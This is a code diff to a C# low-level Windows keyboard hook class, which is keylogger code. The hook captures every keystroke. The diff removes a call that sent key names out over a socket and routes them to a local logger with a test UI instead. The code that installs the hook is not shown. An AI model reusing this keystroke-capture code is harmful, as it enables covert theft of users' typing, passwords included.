@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
@@ -20,9 +21,13 @@ namespace IP
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool _disposed = false;
         private static string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private static TestUI _ui;
+        private static LoggerWriter _log;
 
-        public LLKeyboardHook()
+        public LLKeyboardHook(TestUI ui, LoggerWriter log)
         {
+            _log = log; 
+            _ui = ui;
             _proc = HookCallback;
         }
 
@@ -56,9 +61,7 @@ namespace IP
             {
                 /* Extract the virtual key code of the pressed key */
                 int vkCode = Marshal.ReadInt32(lParam);
-                LoggerWriter.WriteToLog(vkCode,docPath);
-                SocketWriter.WriteToSocket(((Keys)vkCode).ToString());
-                Console.WriteLine((Keys)vkCode);
+                _log.HandleVK(vkCode, docPath, _ui);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
